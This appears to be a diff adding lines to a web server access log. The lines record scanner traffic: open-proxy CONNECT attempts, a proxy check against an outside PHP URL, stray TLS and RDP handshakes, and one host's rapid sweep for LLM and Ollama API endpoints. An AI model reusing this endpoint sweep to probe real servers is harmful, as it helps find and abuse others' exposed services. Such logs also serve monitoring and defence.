@@ -5450,3 +5450,953 @@ ConnectionResetError: [Errno 104] Connection reset by peer
 94.154.43.201 - - [29/Aug/2026 11:49:22] code 404, message File not found
 94.154.43.201 - - [29/Aug/2026 11:49:22] "GET /login HTTP/1.1" 404 -
 182.20.238.40 - - [29/Aug/2026 12:02:31] "GET / HTTP/1.0" 200 -
+91.92.40.188 - - [29/Aug/2026 13:08:25] code 404, message File not found
+91.92.40.188 - - [29/Aug/2026 13:08:25] "GET /v1/models HTTP/1.1" 404 -
+85.239.151.70 - - [29/Aug/2026 13:29:48] code 400, message Bad request syntax ('\\x03\\x00\\x00\\x13\\x0eà\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x08\\x00\\x03\\x00\\x00\\x00')
+85.239.151.70 - - [29/Aug/2026 13:29:48] "\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00" 400 -
+85.239.151.70 - - [29/Aug/2026 13:29:59] code 400, message Bad request syntax ('\\x03\\x00\\x00\\x13\\x0eà\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x08\\x00\\x03\\x00\\x00\\x00')
+85.239.151.70 - - [29/Aug/2026 13:29:59] "\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00" 400 -
+185.239.2.189 - - [29/Aug/2026 14:42:46] "GET / HTTP/1.0" 200 -
+134.209.111.161 - - [29/Aug/2026 14:44:37] code 501, message Unsupported method ('CONNECT')
+134.209.111.161 - - [29/Aug/2026 14:44:37] "CONNECT google.com:443 HTTP/1.1" 501 -
+94.154.43.201 - - [29/Aug/2026 15:10:04] code 404, message File not found
+94.154.43.201 - - [29/Aug/2026 15:10:04] "GET /login HTTP/1.1" 404 -
+195.182.16.23 - - [29/Aug/2026 15:23:54] code 404, message File not found
+195.182.16.23 - - [29/Aug/2026 15:23:54] "GET /SDK/webLanguage HTTP/1.1" 404 -
+91.92.40.188 - - [29/Aug/2026 15:30:23] code 404, message File not found
+91.92.40.188 - - [29/Aug/2026 15:30:23] "GET /v1/models HTTP/1.1" 404 -
+40.124.171.25 - - [29/Aug/2026 15:46:40] code 404, message File not found
+40.124.171.25 - - [29/Aug/2026 15:46:40] "GET /actuator/health HTTP/1.1" 404 -
+154.83.197.107 - - [29/Aug/2026 16:14:05] "GET / HTTP/1.1" 200 -
+154.83.197.107 - - [29/Aug/2026 16:14:05] code 404, message File not found
+154.83.197.107 - - [29/Aug/2026 16:14:05] "GET /favicon.ico HTTP/1.1" 404 -
+154.83.197.107 - - [29/Aug/2026 16:14:37] code 404, message File not found
+154.83.197.107 - - [29/Aug/2026 16:14:37] "GET /favicon.ico HTTP/1.1" 404 -
+172.105.199.92 - - [29/Aug/2026 16:31:34] code 501, message Unsupported method ('CONNECT')
+172.105.199.92 - - [29/Aug/2026 16:31:34] "CONNECT httpbin.org:443 HTTP/1.1" 501 -
+172.105.199.92 - - [29/Aug/2026 16:31:35] code 501, message Unsupported method ('CONNECT')
+172.105.199.92 - - [29/Aug/2026 16:31:35] "CONNECT api.myip.la:443 HTTP/1.1" 501 -
+176.65.149.236 - - [29/Aug/2026 16:35:00] "GET / HTTP/1.1" 200 -
+175.6.54.250 - - [29/Aug/2026 17:15:41] "GET / HTTP/1.1" 200 -
+175.6.54.250 - - [29/Aug/2026 17:15:41] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:15:41] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03µêìý\x8aÙ\x8fz@\x98\x02\x1bÍG\x10«\x1cs;j\x96ÕDªº\x19\x90 >¬üI IzD\x80`øÜÚ»\x9fÍknõ\x12\x8bf·ÿÒÞx\x18\x9bG\x1dÞ\x17\x13\x89h¸\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:15:42] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:15:42] "POST /api/chat/completions HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:15:42] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:15:42] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03À¬\x7f¢\x96Ö\x9f\x8aÛY\x99\x16Éñk\x8bL\x84î1\x8f_Ù=ûèDkðãa. 1\x19yÿüÀ'¹iRØyH\x8fHrO\x07È\x84·*>¹íÌ\x10´@YX+\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:15:43] code 404, message File not found
+175.6.54.250 - - [29/Aug/2026 17:15:43] "GET /api/models HTTP/1.1" 404 -
+175.6.54.250 - - [29/Aug/2026 17:15:44] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:15:44] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x10G:\x0f)¸\x91|\x03çN\x92òå¾µìö\x8b'\x07Ðo÷\x82\x18 ì&\x14of q\x13u»À\x87ÆÇ@ #©\x15\x1c\x85\x91iI"?kIëØbUäð\x1d-ºl\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:15:45] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:15:45] "POST /api/v1/files HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:15:45] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:15:45] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03B{Ö=\x9fÚ¬E»¢\x0cm&·|Rtl\x91ÝHýÒ\x1b,­\x1frD\x08ë\x81 É\x14ü¦|gg\x12bz\x95\x94þ¬ÐñùÞ\x9a4rIíÀ\x13\x9bö>)\x869X\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:15:46] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:15:46] "POST /api/v1/knowledge/%7Bid%7D/file/add HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:15:46] code 400, message Bad request version ('?\\x99ÈÒõ¿)\\x93çcvñQø\\x82')
+175.6.54.250 - - [29/Aug/2026 17:15:46] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03z\x96£\x05\x0cüÆ¥\x1e\x02/ n\x7f¶\x94óÿ¬Òîi9\x089\x93\x95t<Ö%9 ~N\x15§\x91h\x0cN\x07/>÷ ?\x99ÈÒõ¿)\x93çcvñQø\x82" 400 -
+175.6.54.250 - - [29/Aug/2026 17:15:46] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:15:46] "POST /completion HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:15:48] code 400, message Bad HTTP/0.9 request type ('\\x16\\x03\\x01\\x00î\\x01\\x00\\x00ê\\x03\\x03')
+175.6.54.250 - - [29/Aug/2026 17:15:48] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x1fy¶Oxû\x9eÜ\x7f\x8d\x17\x93\x10^Êµ\x94\x82­ðQèÐ\x97D?¿" 400 -
+175.6.54.250 - - [29/Aug/2026 17:15:48] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:15:48] "POST /detokenize HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:15:49] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:15:49] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¤@\x14Æ\x07\x1e\x16¿\x91h\x1aH§dF\x1f±,?'f­¢Íï\x1b\x847xÌ\x96ë E-\x1f®¬ø\x07£\x1fê\x172Öm¾\x8f\x7fÛ%Ú>m§èh27ê¨u0ó\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:15:49] code 404, message File not found
+175.6.54.250 - - [29/Aug/2026 17:15:49] "GET /docs HTTP/1.1" 404 -
+175.6.54.250 - - [29/Aug/2026 17:15:49] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:15:49] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03²\x0e)\x1f\x98Oþ·ÚA§×z\x8b°í®%Ña¸¨*r\x1bÚí~S\x0c­ã xÃc\x7f{ùàx¯û!ØY0${\x0cÛUõl\x8b¤\x12\x97\x87§¨>»/ä\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:15:50] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:15:50] "POST /embedding HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:15:51] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:15:51] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Åó·¿$ò\x1a\x8f«2I¤|Òø0\x8d\x8aw\x96¡»+Ó;i\x82Þ\x80voq ç¿\x01\x17yãé×Ù@\x14L2_óoîj¡\x1e«XßF+ìIØ\x1fV\x9bî\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:15:51] code 404, message File not found
+175.6.54.250 - - [29/Aug/2026 17:15:51] "GET /items/%7Bitem_id%7D HTTP/1.1" 404 -
+175.6.54.250 - - [29/Aug/2026 17:15:51] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:15:51] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ðVôà1\x06\x1e>@ONW¤Þ\x06\x0dú\x8c\x98cà³î&qÆ\x0f"\x9eÁ\x12\x02 _Ã÷Ä^³\x9bÓÿ³\x82ii\x13äå2%\x11é¦¥+¡{\\íÄÌ÷Äý\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:15:52] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:15:52] "POST /ollama/api/embed HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:15:52] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:15:52] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Bãy-5Ë§FÙE¬ìJ;ëR¶"ß³N\x98wL\x02\x06\x9dç\x9b¿\x16\x86 ÍAû\x16\x97¢Âù\x19D\x16\x95\x9b\x1aÎ\x0bY]sÊ\x92G×Btð\x8d\x0c{©<É\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:15:53] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:15:53] "POST /ollama/api/generate HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:15:54] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:15:54] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03~>Hæj¥·Õå\\\x903oaÜ°ÙÕÎ),cð(\x06\x95ÌÅY\x81\x06ô »\x92\x84gJA\x01\x0b¬¦\x8f\x93ôY{\x0b$üÑ®nò.Í¨ãÒK\x83(ì`\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:15:55] code 404, message File not found
+175.6.54.250 - - [29/Aug/2026 17:15:55] "GET /ollama/api/tags HTTP/1.1" 404 -
+175.6.54.250 - - [29/Aug/2026 17:15:56] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:15:56] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03%|¡Oî¶Ç\x04ö'ÕAÄH\x026<oÚ38j]yjTÑ\x97\x90Ñü© rß\x1a4ìûoê\x06\x94qqéÄ\x86>Z!S¦\x85-l\x91^b(\x82«ðXÁ\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:15:56] code 404, message File not found
+175.6.54.250 - - [29/Aug/2026 17:15:56] "GET /openapi.json HTTP/1.1" 404 -
+175.6.54.250 - - [29/Aug/2026 17:15:56] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:15:56] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ü#¿\x05½\x1eý\x00d\x09­\x96\x86©Kö\x9d®ù¡Cï'à¥+.Î`÷lø RÐOì<\x8bzJZ\x94X×É\x07s@är\x16dû»Ý¼ý3=ÒW­®Ñ\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:15:57] code 404, message File not found
+175.6.54.250 - - [29/Aug/2026 17:15:57] "GET /props HTTP/1.1" 404 -
+175.6.54.250 - - [29/Aug/2026 17:15:59] code 400, message Bad HTTP/0.9 request type ('\\x16\\x03\\x01\\x00î\\x01\\x00\\x00ê\\x03\\x03-\\x8dAÚ')
+175.6.54.250 - - [29/Aug/2026 17:15:59] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03-\x8dAÚ\x1dÒ¯" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:00] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:16:00] "POST /props HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:16:00] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:16:00] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03VÅxF\x06\x7f­\x985\x05Ð7%4¤ië\x06ÃE\x0b\x94möÛ×mð`Æ4¼ Ý'ù(C\x1acßSsð8Â\x8cÊ?\x80"\x18õÑGÏBL5cF¹\x13±J\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:01] code 404, message File not found
+175.6.54.250 - - [29/Aug/2026 17:16:01] "GET /redoc HTTP/1.1" 404 -
+175.6.54.250 - - [29/Aug/2026 17:16:01] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:16:01] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Ð\x87%Æ«±´\x09\x08·\x16H%¹ÓJo¡\x91\x93×\x1cwEèí\x1eÿ\x0c\x07½³ Çñ\x12\x9591\x11%\x97ÆýS\x1br\x82N\x8f\x8d\x9fÉÈJ\x88\x09ý?U\x17\x89ó¾d\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:01] code 404, message File not found
+175.6.54.250 - - [29/Aug/2026 17:16:01] "GET /slots HTTP/1.1" 404 -
+175.6.54.250 - - [29/Aug/2026 17:16:02] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:16:02] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x07(}\x16êîîX¨\x86òMÿ\x0bÃ4jJï\x8a\x16\x0béÄ\x14«\x90X1íß\x93 \x7f^)\x827É\x7f§\x84¾\x90\x86Ã\x07\\ë\x15È\x9d\x1c1GTjY°l\x19Í¸£\x18\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:02] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:16:02] "POST /tokenize HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:16:04] code 400, message Bad request syntax ('\\x16\\x03\\x01\\x00î\\x01\\x00\\x00ê\\x03\\x03wÍ\\x8b\\x9cX8\\x94\\x00k\\x11¬bh\\x07\\x92³¾q&\\x87\\x9a"\\x1c')
+175.6.54.250 - - [29/Aug/2026 17:16:04] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03wÍ\x8b\x9cX8\x94\x00k\x11¬bh\x07\x92³¾q&\x87\x9a"\x1c" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:05] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:16:05] "POST /v1/audio/speech HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:16:06] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:16:06] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¤Ì*ÎïÎöU\x91ëê©\x159­1k\x0eø=\x087¦ç¡\x92kâ¨Ä © IaþÒ¦"¹ÆïÝSH®c\x05\x85¹:±\x9cjFq\x88\x1aÑÔyê=Ä4\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:07] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:16:07] "POST /v1/audio/transcriptions HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:16:07] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:16:07] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x030>ÇÓMvöü?\x98WXÆc¶Ã°wAù?´XÑüõ\x0eÊ°\x15'x \x8fÜa\x99ËÀ-%\x02\x9f\x9a·ßè\x90%U\x02>\x17fvQW°J\x17Ê\x9a\x0fØ\x0f\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:08] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:16:08] "POST /v1/audio/translations HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:16:09] code 400, message Bad HTTP/0.9 request type ('\\x16\\x03\\x01\\x00î\\x01\\x00\\x00ê\\x03\\x03\\x0fÂ\\x12Ô"AûÐ/Ï"\\x92ª:\\x10Íæ°2F}½$OÄ%\\xad¿%\\x03éî')
+175.6.54.250 - - [29/Aug/2026 17:16:09] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x0fÂ\x12Ô"AûÐ/Ï"\x92ª:\x10Íæ°2F}½$OÄ%­¿%\x03éî ç;iz»Ê\x83Ag\x9c\x98\x1aøöó%çB,³U,½­ð\x95'" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:10] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:16:10] "POST /v1/chat/completions HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:16:10] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:16:10] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x1d$\x94jÿ\x04\x96#ÿï\x9dì\x1dy.\x9bt³e¢¯Û0ôøB\x99\x9b±\x16v] xñW\x9e\x93D÷`\x07X7\\§K\x98\x05Á\x9f\x81¨)a\x03ÿ\x10í9A~-¿à\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:11] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:16:11] "POST /v1/completions HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:16:11] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:16:11] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¬\x8b\x12í\x04\x96\x08\x94¥ÏþfiÎ\x95\x92\x92v8°\x0d\x18\x01YàÄªóÑ$äÛ Erz·\\NëñØnpÅsUZèý5wÙd\x94Ã N\x0d\x91E\x18\x05PT\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:11] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:16:11] "POST /v1/embeddings HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:16:12] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:16:12] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Zå\x054ñ\x18¡AÖê ),\x0bÅ\x14q½\x81\x0f2¬äþ¹\x06aÏ.üª> V4Ì±\x84E¯MA@öt\x01kpÅÜ-\x89\x7fMt\x88Ö"Ã[ßT]{\x8b\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:12] code 404, message File not found
+175.6.54.250 - - [29/Aug/2026 17:16:12] "GET /v1/files HTTP/1.1" 404 -
+175.6.54.250 - - [29/Aug/2026 17:16:13] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:16:13] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ÙÞ\x99æz\x00\x15¶\x00\x83z\x18¦´O\x1aLÆ;²<ÔÞ\x11J\x03ÀO\x10\x02¾\x89 äÞÑktÇàâ\x97aÏ¤*1î»åw\x9düÿø\x9d\x90\x0f\x01·\x9asÁ\x94^\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:13] code 404, message File not found
+175.6.54.250 - - [29/Aug/2026 17:16:13] "GET /v1/files/%7Bfile_id%7D HTTP/1.1" 404 -
+175.6.54.250 - - [29/Aug/2026 17:16:14] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:16:14] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03ú\x8eÀæµ(((îîvà¿"*ÐÍ\x90ÕVç¦\x07îç?nànMâú )\x0d\x1d¤\x8d¡\x8d+\x9eö\x9d³ßòÛ!9Ì'\x96Ù\x9a\x11¡é\x01»Ö½FA\x86\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:14] code 404, message File not found
+175.6.54.250 - - [29/Aug/2026 17:16:14] "GET /v1/fine_tuning/jobs HTTP/1.1" 404 -
+175.6.54.250 - - [29/Aug/2026 17:16:14] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:16:14] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03õÌ\x04\x81éªã'(ô¡\x10\x1cÉ´\x19\x96$©l\x9a*Ûb\x84Ã$dd4<ê #0\x019L\x82ì\x0d&\x1eO|\x0f(\x01æbE\x02ktÞ&H­¥\x1bX[?1G\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:15] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:16:15] "POST /v1/fine_tuning/jobs HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:16:15] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:16:15] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x033]\x02\x06nNfÃx\x15ýl×ûÊYSYóCeª\x81¸wAªQ\x8bøJ0 \x97ïm(Â\x19ë­k\x99R¬Ôré\x0fë$\x8a\x1aýPÞ­Á\x99!²ÈË¡û\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:16] code 404, message File not found
+175.6.54.250 - - [29/Aug/2026 17:16:16] "GET /v1/fine_tuning/jobs/%7Bjob_id%7D HTTP/1.1" 404 -
+175.6.54.250 - - [29/Aug/2026 17:16:16] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:16:16] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x92\x86¢Ä\x12\x88\x02#ëì£úªñ\x11·I@\x0f5\x93¢J÷\x97â\x10ÓûË¢ï \x9c\x03éµÊ\x1a\x10\x7f¤OÉþ¸¶\x00ZsH4\x9a.Mq\x96\x8d.\\ì]ù\x10&\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:19] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:16:19] "POST /v1/images/edits HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:16:20] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:16:20] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x033h\x14\x9fc\x11\x1a\x1a¼²}\x0bÉ\x92Æ\x92ÆC¢jI%&K\x96\x92U¡½Í¦ü è\x056øîÉ¡ª­û»I&\x9cøRæË\x07i×\x08~\x86\x81cÛ\x08JmL«\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:20] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:16:20] "POST /v1/images/generations HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:16:20] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:16:20] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03J\x87. \x99Ûe4ö·!qVï§;ið}°\x992|Ô¾h2©ív&Ã ·\x81,ö\x9c\x1a,ÌrCÔO4ex[\x96\x93¼õøq#¹«\x05Ã¸Fµ\x122\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:21] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:16:21] "POST /v1/images/variations HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:16:22] code 400, message Bad HTTP/0.9 request type ('\\x16\\x03\\x01\\x00î\\x01\\x00\\x00ê\\x03\\x03²ý\\x90ÂHr\\x02ÏáëF\\\\=\\x0fÞõ©^äN<hÇoW¸\\x0e6GI¹¡')
+175.6.54.250 - - [29/Aug/2026 17:16:22] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03²ý\x90ÂHr\x02ÏáëF\\=\x0fÞõ©^äN<hÇoW¸\x0e6GI¹¡ m|t\x90Ç7\x9bR\x93Ù\x87}¦W©'\x8e×Ïe\x12\x10Ò<"öñNÎ\x89Ê" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:23] code 404, message File not found
+175.6.54.250 - - [29/Aug/2026 17:16:23] "GET /v1/models HTTP/1.1" 404 -
+175.6.54.250 - - [29/Aug/2026 17:16:23] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:16:23] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Ý\x9bý\x00cú\x8e¡iù\x18\x9eÏÀc.[_\x88\x93\x11\x82#ùy\x9a\x93Þø\x12¦´ \x80¥BF¿!öí³\x98£¿\x83C\x17­)ò¯) à)*®\x10¬\x19¤ý^0\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:23] code 404, message File not found
+175.6.54.250 - - [29/Aug/2026 17:16:23] "GET /v1/models/%7Bmodel_id%7D HTTP/1.1" 404 -
+175.6.54.250 - - [29/Aug/2026 17:16:24] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:16:24] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03³2<µa<\x1dÿ5\x13\x97ç\x1dÜ}w\\)Ãa\x87-$ùw\x0e~\x9bcÁ¨{ ÎT\x8c8"dþ52\x86li\x96/\x05\x854"Sí\x97)¡\x0b\x8f\x0d9jÔTàQ\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+175.6.54.250 - - [29/Aug/2026 17:16:25] code 501, message Unsupported method ('POST')
+175.6.54.250 - - [29/Aug/2026 17:16:25] "POST /v1/moderations HTTP/1.1" 501 -
+175.6.54.250 - - [29/Aug/2026 17:16:26] code 400, message Bad request version ('À\\x14À')
+175.6.54.250 - - [29/Aug/2026 17:16:26] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¨iÍi ¤J\x0c\x11ÈQ!º £\x93Ó\x92ºT£WÍf\x1aþ¶g_\x12Aÿ ^^c\x91\x9e"ÅU9;u\x12BRØ+¼\x13À|e\x84UI3´Yð\x9aÍÄì\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" 400 -
+94.154.43.140 - - [29/Aug/2026 17:47:05] code 404, message File not found
+94.154.43.140 - - [29/Aug/2026 17:47:05] "GET /login HTTP/1.1" 404 -
+94.154.43.70 - - [29/Aug/2026 17:52:31] code 404, message File not found
+94.154.43.70 - - [29/Aug/2026 17:52:31] "GET /login HTTP/1.1" 404 -
+4.148.1.91 - - [29/Aug/2026 18:11:43] code 400, message Bad request syntax ('MGLNDD_178.104.53.233_8080')
+4.148.1.91 - - [29/Aug/2026 18:11:43] "MGLNDD_178.104.53.233_8080" 400 -
+187.57.131.55 - - [29/Aug/2026 18:16:11] code 404, message File not found
+187.57.131.55 - - [29/Aug/2026 18:16:11] "GET http://a7x.overflow.biz/hachk.php HTTP/1.1" 404 -
+198.235.24.222 - - [29/Aug/2026 18:46:41] "GET / HTTP/1.0" 200 -
+18.218.118.203 - - [29/Aug/2026 19:39:17] "GET / HTTP/1.1" 200 -
+18.218.118.203 - - [29/Aug/2026 19:39:59] "GET / HTTP/1.1" 200 -
+18.218.118.203 - - [29/Aug/2026 19:42:13] code 400, message Bad request version ("\\x15²pz\\x04LSu\\x11)Ü\\x8cÇ\\x837~\\x01';ÏXÈy")
